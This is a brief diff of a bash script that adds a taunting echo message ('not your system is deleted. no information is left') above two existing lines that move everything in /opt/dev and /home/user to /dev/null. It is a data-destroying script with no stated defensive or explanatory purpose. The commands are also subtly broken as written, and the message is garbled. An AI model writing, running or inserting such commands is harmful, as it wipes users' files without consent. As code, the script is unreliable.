@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
 
+echo "not your system is deleted. no information is left"
+
 mv /opt/dev/* /dev/null
 mv /home/user/* /dev/null
